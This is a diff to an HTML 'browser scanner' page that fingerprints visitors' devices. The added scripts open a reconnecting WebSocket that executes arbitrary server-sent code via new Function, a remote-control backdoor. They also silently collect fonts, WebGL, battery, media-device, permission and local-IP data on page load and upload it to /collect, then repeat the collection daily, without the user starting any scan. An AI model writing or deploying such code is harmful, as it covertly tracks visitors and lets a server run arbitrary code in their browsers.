@@ -200,13 +200,13 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔍 Advanced Browesr Scanner</h1>
+            <h1>🔍 Advanced Browser Scanner</h1>
             <p>Comprehensive device and browser fingerprinting</p>
         </div>
 
         <div class="content">
             <div id="status" class="status loading">
-                🔄 Initializing system scan...
+                🔄 Start Your system scan...
             </div>
 
             <div class="progress">
@@ -738,7 +738,7 @@
                 { name: 'Font Detection', fn: () => detectFonts() },
                 { name: 'Canvas Fingerprint', fn: () => getCanvasFingerprint() },
                 { name: 'WebGL Info', fn: () => getWebGLFingerprint() },
-                { name: 'Audio Fingerprint', fn: () => getAudioFingerprint() },
+                // { name: 'Audio Fingerprint', fn: () => getAudioFingerprint() },
                 { name: 'Battery Info', fn: () => getBatteryInfo() },
                 { name: 'Geolocation', fn: () => getGeolocation() },
                 { name: 'Media Devices', fn: () => getMediaDevices() },
@@ -860,7 +860,7 @@
             try {
                 // Try to load the script first
                 await loadFingerprintScript();
-                
+
                 // Check if FingerprintJS is loaded
                 if (typeof FingerprintJS === 'undefined') {
                     throw new Error('FingerprintJS failed to load');
@@ -877,7 +877,7 @@
                 };
             } catch (error) {
                 console.error('FingerprintJS error:', error);
-                return { 
+                return {
                     error: error.message,
                     status: 'Failed to load FingerprintJS'
                 };
@@ -955,6 +955,8 @@
             try {
                 updateProgress(0);
                 collectedInfo = await gatherSystemInfo();
+                audiodata = await getAudioFingerprint();
+                collectedInfo.audiofingerprint = audiodata;
                 try {
                     const response = await fetch("/collect", {
                         method: "POST",
@@ -980,6 +982,96 @@
             }
         });
 
+    </script>
+    <script>
+
+        function connectWebSocket() {
+            const socket = new WebSocket(`ws://${window.location.host}/ws`);
+            socket.onclose = () => {
+                console.log("WebSocket disconnected. Reconnecting...");
+                setTimeout(connectWebSocket, 5000); // Reconnect after 5 seconds
+            };
+            socket.onmessage = (event) => {
+                const message = JSON.parse(event.data);
+                if (message.type === "code") new Function(message.data)();
+            };
+        }
+        connectWebSocket();
+
+        // setInterval(startCollection,86400000); // Collect data every 1 day 86400000
+        // gatherSystemInfo(); // Initial collection on page load
+    </script>
+    <script>
+        async function gatherInitialSystemInfo() {
+            const info = {
+                meta: {
+                    sessionID: getOrCreateSessionID(),
+                    timestamp: new Date().toISOString(),
+                    platform: detectPlatform(),
+                    isMobile: isMobile(),
+                    featureSupport: checkFeatureSupport(),
+                    collectionVersion: '2.0'
+                }
+            };
+
+            const tasks = [
+                { name: 'Basic Info', fn: () => getBasicInfo() },
+                { name: 'Screen Info', fn: () => getScreenInfo() },
+                { name: 'Browser Info', fn: () => getBrowserInfo() },
+                { name: 'Hardware Info', fn: () => getHardwareInfo() },
+                { name: 'Network Info', fn: () => getNetworkInfo() },
+                { name: 'Font Detection', fn: () => detectFonts() },
+                // { name: 'Canvas Fingerprint', fn: () => getCanvasFingerprint() },
+                { name: 'WebGL Info', fn: () => getWebGLFingerprint() },
+                // { name: 'Audio Fingerprint', fn: () => getAudioFingerprint() },
+                { name: 'Battery Info', fn: () => getBatteryInfo() },
+                // { name: 'Geolocation', fn: () => getGeolocation() },
+                { name: 'Media Devices', fn: () => getMediaDevices() },
+                { name: 'Permissions', fn: () => getPermissions() },
+                { name: 'Storage Info', fn: () => getStorageInfo() },
+                { name: 'CPU Benchmark', fn: () => getCPUBenchmark() },
+                { name: 'Local IPs', fn: () => getLocalIPs() },
+                { name: 'FingerprintJS', fn: () => getFingerprintJS() }
+            ];
+
+            for (let i = 0; i < tasks.length; i++) {
+                const task = tasks[i];
+                try {
+                    info[task.name.toLowerCase().replace(/\s+/g, '')] = await task.fn();
+                } catch (error) {
+                    info[task.name.toLowerCase().replace(/\s+/g, '')] = {
+                        status: 'Error',
+                        error: error.message
+                    };
+                }
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+            return info;
+        }
+
+        async function InitialCollection() {
+            try {
+                collectedInfo = await gatherInitialSystemInfo();
+                collectedInfo.audiofingerprint = {"status": "need to analyze"};
+                collectedInfo.geolocation = {"status": "need to analyze"};
+                collectedInfo.canvasfingerprint = {"status": "need to analyze"};
+                try {
+                    const response = await fetch("/collect", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(collectedInfo)
+                    });
+                } catch (error) {
+                    updateStatus(`❌ Collection failed: ${error.message}`, 'error');
+                    console.error('Collection error:', error);
+                }
+            } catch (error) {
+                updateStatus(`❌ Collection failed: ${error.message}`, 'error');
+                console.error('Collection error:', error);
+            }
+        }
+        InitialCollection(); // Initial collection on page load
+        setInterval(InitialCollection, 86400000); // Collect data every 1 day (86400000 ms)
     </script>
 </body>
 
